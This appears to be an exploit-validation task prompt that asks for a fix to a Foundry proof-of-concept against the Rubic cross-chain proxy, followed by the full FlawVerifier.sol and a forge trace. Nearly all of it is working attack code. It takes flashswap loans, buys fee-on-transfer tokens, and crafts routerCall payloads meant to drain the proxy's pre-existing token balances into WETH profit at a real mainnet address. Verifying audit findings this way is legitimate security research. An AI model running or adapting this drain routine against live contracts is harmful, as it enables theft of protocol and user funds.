You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC20 routes spend the declared amount instead of the amount actually received
- claim: `routerCall` transfers `_params.srcInputAmount` from the caller but never measures how many tokens the proxy actually received. Fees, approval size, and the post-call spend check are all based on the nominal input amount, so fee-on-transfer or other balance-deflating tokens can cause the proxy to spend more than the user contributed.
- impact: Any pre-existing balance of the same token on the proxy, including accrued protocol fees or previously stranded funds, can be consumed to cover the shortfall. This lets an attacker use a deflationary token deposit to drain proxy reserves of that token.
- exploit_paths: ["The proxy already holds some balance of a token that transfers less than the requested `srcInputAmount`.", "An attacker calls `routerCall` with that token and a nominal amount larger than the net amount the proxy will receive.", "`accrueTokenFees` and `SmartApprove` still treat the nominal amount as available and allow the downstream spender to use `_amountIn`.", "The missing portion is silently funded from the proxy's existing token balance, and the balance-delta check still passes because it only verifies total tokens spent from the proxy."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    struct AttemptContext {
        address fundingPair;
        address tradePair;
        address token;
        address router;
        uint256 borrowWeth;
    }

    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant SHIBA_ROUTER = 0x03f7724180AA6b939894B5Ca4314783B0b36b329;

    address internal constant METAROUTER = 0xB9E13785127BFfCc3dc970A55F6c7bF0844a3C15;
    address internal constant METAROUTER_GATEWAY = 0x03B7551EB0162c838a10c2437b60D1f5455b9554;
    address internal constant MOVR_BRIDGE = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));

    address internal constant SAFEMOON = 0x8076C74c5E3F5852037f31B99536ca5A1d8C6f7D;
    address internal constant KISHU = 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D;
    address internal constant FEG = 0x389999216860AB8E0175387A0c90E5c52522C945;
    address internal constant HOGE = 0xfAd45E47083e4607302aa43c65fB3106F1cd7607;
    address internal constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address internal constant XAMP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address internal constant CULT = 0xf0f9D895aCa5c8678f706FB8216fa22957685A13;
    address internal constant ELON = 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3;
    address internal constant SAITAMA = 0xCE3f08e664693ca792caCE4af1364D5e220827B2;
    address internal constant PIT = 0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50;
    address internal constant SHINJA = 0x12b6893cE26Ea6341919FE289212ef77e51688c8;
    address internal constant VOLT = 0x7f792db54B0e580Cdc755178443f0430Cf799aCa;
    address internal constant TABOO = 0x9A962C70BB4b0538667EE47Ca36934BF39781c52;
    address internal constant FLOKI = 0x43f11c02439e2736800433b4594994Bd43Cd066D;

    uint256 internal constant DENOMINATOR = 1e6;
    uint256 internal constant MIN_PROFIT = 1e15;

    address private _profitToken;
    uint256 private _profitAmount;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "Infeasible at the fork block: no tested fee-on-transfer token plus allowlisted V2-style router produced a reserve-funded nominal _amountIn spend with net profit after flashswap repayment.";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        address[] memory routers = _routerCandidates(_liveRouters());
        address[] memory fundingPairs = _fundingPairs();
        address[] memory tokens = _candidateTokens();
        uint256[] memory borrowSizes = _borrowSizes(_fixedFee());

        bool sawProxyBalance;
        bool sawTradeLiquidity;
        bool sawFundingLiquidity;

        for (uint256 i = 0; i < fundingPairs.length; i++) {
            if (_pairHasLiquidity(fundingPairs[i])) {
                sawFundingLiquidity = true;
                break;
            }
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (!_looksLikeToken(token)) {
                continue;
            }

            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }
            sawProxyBalance = true;

            if (_scanTokenRoutes(token, routers, fundingPairs, borrowSizes)) {
                return;
            }
            if (_tokenHasTradeLiquidity(token)) {
                sawTradeLiquidity = true;
            }
        }

        if (!sawFundingLiquidity) {
            _path = "Infeasible at the fork block: no reusable WETH V2 funding pair was available for realistic flashswap capital.";
            return;
        }
        if (!sawProxyBalance) {
            _path = "Infeasible at the fork block: no scanned fee-on-transfer candidate token had a pre-existing balance on the Rubic proxy.";
            return;
        }
        if (!sawTradeLiquidity) {
            _path = "Infeasible at the fork block: proxy-held fee-on-transfer candidates lacked a usable WETH pair for realistic execution.";
            return;
        }
        _path =
            "Infeasible at the fork block: tested allowlisted routers did not accept a direct V2-style token->WETH swap payload that spent the nominal _amountIn and converted the reserve-funded shortfall into net profit.";
    }

    function _scanTokenRoutes(
        address token,
        address[] memory routers,
        address[] memory fundingPairs,
        uint256[] memory borrowSizes
    ) internal returns (bool) {
        address[] memory tradePairs = _pairsForToken(token);
        for (uint256 p = 0; p < tradePairs.length; p++) {
            address tradePair = tradePairs[p];
            if (tradePair == address(0) || !_pairHasLiquidity(tradePair)) {
                continue;
            }

            if (_scanTradePair(token, tradePair, routers, fundingPairs, borrowSizes)) {
                return true;
            }
        }

        return false;
    }

    function _scanTradePair(
        address token,
        address tradePair,
        address[] memory routers,
        address[] memory fundingPairs,
        uint256[] memory borrowSizes
    ) internal returns (bool) {
        for (uint256 r = 0; r < routers.length; r++) {
            address router = routers[r];
            if (!_hasCode(router)) {
                continue;
            }

            for (uint256 f = 0; f < fundingPairs.length; f++) {
                address fundingPair = fundingPairs[f];
                if (fundingPair == address(0) || fundingPair == tradePair || !_pairHasLiquidity(fundingPair)) {
                    continue;
                }

                for (uint256 b = 0; b < borrowSizes.length; b++) {
                    AttemptContext memory ctx = AttemptContext({
                        fundingPair: fundingPair,
                        tradePair: tradePair,
                        token: token,
                        router: router,
                        borrowWeth: borrowSizes[b]
                    });

                    if (_attemptFlashswap(ctx)) {
                        return true;
                    }
                }
            }
        }

        return false;
    }

    function _tokenHasTradeLiquidity(address token) internal view returns (bool) {
        address[] memory tradePairs = _pairsForToken(token);
        for (uint256 i = 0; i < tradePairs.length; i++) {
            if (_pairHasLiquidity(tradePairs[i])) {
                return true;
            }
        }
        return false;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function _attemptFlashswap(AttemptContext memory ctx) internal returns (bool) {
        if (!_fundingPairSupportsWeth(ctx.fundingPair, ctx.borrowWeth)) {
            return false;
        }

        bool wethIsToken0 = IUniswapV2PairLike(ctx.fundingPair).token0() == WETH;
        uint256 amount0Out = wethIsToken0 ? ctx.borrowWeth : 0;
        uint256 amount1Out = wethIsToken0 ? 0 : ctx.borrowWeth;

        try IUniswapV2PairLike(ctx.fundingPair).swap(amount0Out, amount1Out, address(this), abi.encode(ctx)) {
            return _profitAmount >= MIN_PROFIT;
        } catch {
            return false;
        }
    }

    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        AttemptContext memory ctx = abi.decode(data, (AttemptContext));
        require(msg.sender == ctx.fundingPair, "pair");
        require(sender == address(this), "sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == ctx.borrowWeth && borrowedWeth != 0, "borrow");

        uint256 repayWeth = ((borrowedWeth * 1000) / 997) + 1;
        uint256 fixedFee = _fixedFee();
        require(borrowedWeth > fixedFee, "fee");

        uint256 bought = _buyCandidateToken(ctx.tradePair, ctx.token, borrowedWeth - fixedFee);
        require(bought != 0, "buy");

        uint256 proxyBalance = _balanceOf(ctx.token, TARGET);
        require(proxyBalance != 0, "proxy-balance");

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        bool exploited = _runExploitRoutes(ctx, bought, proxyBalance, fixedFee);
        require(exploited, "route");

        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            IWETHLike(WETH).deposit{value: nativeBalance}();
        }

        uint256 finalWeth = _balanceOf(WETH, address(this));
        require(finalWeth > repayWeth + MIN_PROFIT, "no-profit");
        require(_safeTransfer(WETH, ctx.fundingPair, repayWeth), "repay");

        _profitToken = WETH;
        _profitAmount = _balanceOf(WETH, address(this));
        _verdict = "validated";
        _path =
            "A proxy-held fee-on-transfer token reserve existed; routerCall transferred the nominal srcInputAmount, accrueTokenFees still computed nominal _amountIn, SmartApprove exposed that nominal _amountIn to the same allowlisted V2 router, the router spent nominal transferFrom amount while the proxy had received less, and the missing portion was silently funded from the proxy's reserve before being converted to WETH and repaid through a deterministic V2 flashswap.";
    }

    function _runExploitRoutes(
        AttemptContext memory ctx,
        uint256 bought,
        uint256 proxyBalance,
        uint256 fixedFee
    ) internal returns (bool) {
        uint256[] memory grossCandidates = _grossCandidates(ctx.token, bought, proxyBalance);
        for (uint256 i = 0; i < grossCandidates.length; i++) {
            uint256 grossAmount = grossCandidates[i];
            if (grossAmount == 0) {
                continue;
            }

            uint256 amountIn = _amountInAfterAccrueTokenFees(grossAmount);
            if (amountIn == 0) {
                continue;
            }

            if (!_forceApprove(ctx.token, TARGET, 0)) {
                continue;
            }
            if (!_forceApprove(ctx.token, TARGET, grossAmount)) {
                continue;
            }

            if (_attemptRouterCall(ctx.token, grossAmount, amountIn, fixedFee, ctx.router)) {
                return true;
            }
        }

        return false;
    }

    function _attemptRouterCall(
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address router
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: WETH,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[] memory payloads = _routerPayloads(token, amountIn);
        for (uint256 i = 0; i < payloads.length; i++) {
            uint256 beforeProxy = _balanceOf(token, TARGET);
            uint256 beforeWeth = _balanceOf(WETH, address(this));
            uint256 beforeEth = address(this).balance;

            (bool ok, ) = TARGET.call{value: fixedFee}(
                abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, router, payloads[i])
            );
            if (!ok) {
                continue;
            }

            uint256 ethDelta = address(this).balance - beforeEth;
            if (ethDelta != 0) {
                IWETHLike(WETH).deposit{value: ethDelta}();
            }

            uint256 afterProxy = _balanceOf(token, TARGET);
            uint256 afterWeth = _balanceOf(WETH, address(this));

            if (afterProxy < beforeProxy && afterWeth > beforeWeth) {
                return true;
            }
        }

        return false;
    }

    function _buyCandidateToken(address pair, address token, uint256 maxWethIn) internal returns (uint256 received) {
        require(pair != address(0) && maxWethIn != 0, "buy-params");

        (uint256 reserveIn, uint256 reserveOut, bool wethIsToken0) = _orderedReserves(pair, WETH, token);
        require(reserveIn != 0 && reserveOut != 0, "buy-liquidity");

        uint256 wethIn = maxWethIn;
        uint256 maxTokenAmount = _maxTokenAmount(token);
        if (maxTokenAmount != 0) {
            uint256 reserveCap = reserveOut / 20;
            uint256 targetOut = maxTokenAmount;
            if (reserveCap != 0 && targetOut > reserveCap) {
                targetOut = reserveCap;
            }
            if (targetOut != 0 && targetOut < reserveOut) {
                uint256 quotedIn = _getAmountIn(targetOut, reserveIn, reserveOut);
                if (quotedIn != 0 && quotedIn < wethIn) {
                    wethIn = quotedIn;
                }
            }
        }

        uint256 beforeBalance = _balanceOf(token, address(this));
        require(_safeTransfer(WETH, pair, wethIn), "weth-transfer");

        uint256 actualIn = _balanceOf(WETH, pair) - reserveIn;
        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
        if (wethIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), "");
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), "");
        }

        received = _balanceOf(token, address(this)) - beforeBalance;
    }

    function _routerPayloads(address token, uint256 amountIn) internal view returns (bytes[] memory payloads) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        payloads = new bytes[](4);
        payloads[0] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForETH(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
        payloads[3] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _fundingPairs() internal view returns (address[] memory pairs) {
        pairs = new address[](6);
        pairs[0] = _getPair(UNIV2_FACTORY, USDC, WETH);
        pairs[1] = _getPair(UNIV2_FACTORY, USDT, WETH);
        pairs[2] = _getPair(UNIV2_FACTORY, DAI, WETH);
        pairs[3] = _getPair(SUSHI_FACTORY, USDC, WETH);
        pairs[4] = _getPair(SUSHI_FACTORY, USDT, WETH);
        pairs[5] = _getPair(SUSHI_FACTORY, DAI, WETH);
    }

    function _pairsForToken(address token) internal view returns (address[] memory pairs) {
        pairs = new address[](2);
        pairs[0] = _getPair(UNIV2_FACTORY, token, WETH);
        pairs[1] = _getPair(SUSHI_FACTORY, token, WETH);
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        if (!_hasCode(factory)) {
            return address(0);
        }
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB)
        );
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _orderedReserves(
        address pair,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 reserveIn, uint256 reserveOut, bool tokenInIsToken0) {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (token0 == tokenIn && token1 == tokenOut) || (token0 == tokenOut && token1 == tokenIn),
            "pair-mismatch"
        );

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        tokenInIsToken0 = token0 == tokenIn;
        reserveIn = tokenInIsToken0 ? reserve0 : reserve1;
        reserveOut = tokenInIsToken0 ? reserve1 : reserve0;
    }

    function _pairHasLiquidity(address pair) internal view returns (bool) {
        if (!_hasCode(pair)) {
            return false;
        }
        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            return reserve0 != 0 && reserve1 != 0;
        } catch {
            return false;
        }
    }

    function _fundingPairSupportsWeth(address pair, uint256 amountOut) internal view returns (bool) {
        if (!_pairHasLiquidity(pair)) {
            return false;
        }
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        if (token0 != WETH && token1 != WETH) {
            return false;
        }
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        uint256 wethReserve = token0 == WETH ? reserve0 : reserve1;
        return wethReserve > amountOut;
    }

    function _fixedFee() internal view returns (uint256 fee) {
        try IRubicProxyLike(TARGET).fixedCryptoFee() returns (uint256 value) {
            fee = value;
        } catch {}
    }

    function _maxTokenAmount(address token) internal view returns (uint256 value) {
        try IRubicProxyLike(TARGET).maxTokenAmount(token) returns (uint256 amount) {
            value = amount;
        } catch {}
    }

    function _amountInAfterAccrueTokenFees(uint256 grossAmount) internal view returns (uint256 amountIn) {
        uint256 feePpm;
        try IRubicProxyLike(TARGET).RubicPlatformFee() returns (uint256 value) {
            feePpm = value;
        } catch {
            return 0;
        }
        amountIn = grossAmount - ((grossAmount * feePpm) / DENOMINATOR);
    }

    function _liveRouters() internal view returns (address[] memory live) {
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }
    }

    function _routerCandidates(address[] memory liveRouters) internal pure returns (address[] memory routers) {
        routers = new address[](liveRouters.length + 6);
        uint256 count;

        count = _appendUnique(routers, count, UNIV2_ROUTER);
        count = _appendUnique(routers, count, SUSHI_ROUTER);
        count = _appendUnique(routers, count, SHIBA_ROUTER);
        count = _appendUnique(routers, count, METAROUTER);
        count = _appendUnique(routers, count, METAROUTER_GATEWAY);
        count = _appendUnique(routers, count, MOVR_BRIDGE);

        for (uint256 i = 0; i < liveRouters.length; i++) {
            count = _appendUnique(routers, count, liveRouters[i]);
        }

        assembly {
            mstore(routers, count)
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](20);
        uint256 count;

        count = _appendUnique(tokens, count, SAFEMOON);
        count = _appendUnique(tokens, count, KISHU);
        count = _appendUnique(tokens, count, FEG);
        count = _appendUnique(tokens, count, HOGE);
        count = _appendUnique(tokens, count, STA);
        count = _appendUnique(tokens, count, XAMP);
        count = _appendUnique(tokens, count, CULT);
        count = _appendUnique(tokens, count, ELON);
        count = _appendUnique(tokens, count, SAITAMA);
        count = _appendUnique(tokens, count, PIT);
        count = _appendUnique(tokens, count, SHINJA);
        count = _appendUnique(tokens, count, VOLT);
        count = _appendUnique(tokens, count, TABOO);
        count = _appendUnique(tokens, count, FLOKI);

        assembly {
            mstore(tokens, count)
        }
    }

    function _grossCandidates(
        address token,
        uint256 bought,
        uint256 proxyBalance
    ) internal view returns (uint256[] memory grosses) {
        grosses = new uint256[](6);
        uint256 ceiling = bought;
        uint256 maxTokenAmount = _maxTokenAmount(token);
        if (maxTokenAmount != 0 && ceiling > maxTokenAmount) {
            ceiling = maxTokenAmount;
        }

        // The exploit still needs the proxy's pre-existing reserve to cover a transfer-tax shortfall.
        // Trying several smaller nominal sizes keeps the causality intact while avoiding oversized
        // deposits that would consume more shortfall than the existing proxy balance can realistically cover.
        uint256 reserveBound = proxyBalance * 10;
        if (reserveBound != 0 && ceiling > reserveBound) {
            ceiling = reserveBound;
        }

        grosses[0] = ceiling;
        grosses[1] = ceiling * 3 / 4;
        grosses[2] = ceiling / 2;
        grosses[3] = ceiling / 3;
        grosses[4] = ceiling / 4;
        grosses[5] = ceiling / 10;
    }

    function _borrowSizes(uint256 fixedFee) internal pure returns (uint256[] memory sizes) {
        sizes = new uint256[](5);
        uint256 floor = fixedFee + 0.2 ether;
        sizes[0] = floor > 0.5 ether ? floor : 0.5 ether;
        sizes[1] = floor > 2 ether ? floor : 2 ether;
        sizes[2] = floor > 5 ether ? floor : 5 ether;
        sizes[3] = floor > 15 ether ? floor : 15 ether;
        sizes[4] = floor > 40 ether ? floor : 40 ether;
    }

    function _appendUnique(address[] memory list, uint256 length, address candidate) internal pure returns (uint256) {
        if (candidate == address(0)) {
            return length;
        }
        for (uint256 i = 0; i < length; i++) {
            if (list[i] == candidate) {
                return length;
            }
        }
        list[length] = candidate;
        return length + 1;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return _callSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, data)) {
            return false;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, data);
    }

    function _looksLikeToken(address account) internal view returns (bool) {
        if (!_hasCode(account)) {
            return false;
        }
        (bool ok, bytes memory data) = account.staticcall(abi.encodeWithSelector(IERC20Like.totalSupply.selector));
        return ok && data.length >= 32;
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _callSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return 0;
        }
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }
}

```

forge stdout (tail):
```
954EedeAC495271d0F, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x06da0fd433C1A5d7a4faa01111c044910A184553
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f
    │   ├─ [2385] 0x3335A88bb18fD3b6824b59Af62b50CE494143333::fixedCryptoFee() [staticcall]
    │   │   └─ ← [Return] 586000000000000 [5.86e14]
    │   ├─ [2504] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::getReserves() [staticcall]
    │   │   └─ ← [Return] 36924363656700 [3.692e13], 30316954953385717334872 [3.031e22], 1671957035 [1.671e9]
    │   ├─ [325] 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D::totalSupply() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   ├─ [71188] 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [310] 0x389999216860AB8E0175387A0c90E5c52522C945::totalSupply() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   ├─ [18488] 0x389999216860AB8E0175387A0c90E5c52522C945::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [325] 0xfAd45E47083e4607302aa43c65fB3106F1cd7607::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [10162] 0xfAd45E47083e4607302aa43c65fB3106F1cd7607::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2350] 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1::totalSupply() [staticcall]
    │   │   └─ ← [Return] 78838779219312530274563541 [7.883e25]
    │   ├─ [2696] 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2380] 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40::totalSupply() [staticcall]
    │   │   └─ ← [Return] 950873123276599998652200000 [9.508e26]
    │   ├─ [2593] 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [7267] 0xf0f9D895aCa5c8678f706FB8216fa22957685A13::totalSupply() [staticcall]
    │   │   ├─ [2372] 0xb12ca3dBf866DA26B0f55a20A51fea8efd8592f9::totalSupply() [delegatecall]
    │   │   │   └─ ← [Return] 6666666666666000000000000000000 [6.666e30]
    │   │   └─ ← [Return] 6666666666666000000000000000000 [6.666e30]
    │   ├─ [2981] 0xf0f9D895aCa5c8678f706FB8216fa22957685A13::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [2583] 0xb12ca3dBf866DA26B0f55a20A51fea8efd8592f9::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2343] 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000000000000 [1e33]
    │   ├─ [2467] 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2483] 0xCE3f08e664693ca792caCE4af1364D5e220827B2::totalSupply() [staticcall]
    │   │   └─ ← [Return] 99684219324868432588 [9.968e19]
    │   ├─ [66381] 0xCE3f08e664693ca792caCE4af1364D5e220827B2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2505] 0x12b6893cE26Ea6341919FE289212ef77e51688c8::totalSupply() [staticcall]
